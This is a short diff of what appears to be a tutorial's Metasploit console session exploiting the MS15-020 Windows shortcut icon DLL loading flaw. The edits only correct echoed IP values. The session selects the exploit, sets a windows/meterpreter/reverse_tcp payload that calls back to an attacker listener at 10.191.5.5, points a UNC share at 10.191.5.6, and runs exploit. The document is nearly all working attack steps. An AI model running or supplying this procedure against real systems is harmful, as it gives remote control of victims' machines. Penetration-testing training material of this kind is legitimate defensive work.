@@ -29,12 +29,15 @@ msf exploit(ms15_020_shortcut_icon_dllloader) > set payload windows/meterpreter/
 payload => windows/meterpreter/reverse_tcp 
 
 msf exploit(ms15_020_shortcut_icon_dllloader) > set lhost 10.191.5.5
-lhost=> 192.168.0.11 
+
+lhost=> 10.191.5.5
 
 msf exploit(ms15_020_shortcut_icon_dllloader) > set UNCHOST 10.191.5.6
-UNCHOST => 192.168.0.10 
 
-msf exploit(ms15_020_shortcut_icon_dllloader) > set UNCSHARE share 
+UNCHOST => 10.191.5.6
+
+msf exploit(ms15_020_shortcut_icon_dllloader) > set UNCSHARE share
+
 UNCSHARE => share 
 
 msf exploit(ms15_020_shortcut_icon_dllloader) > exploit
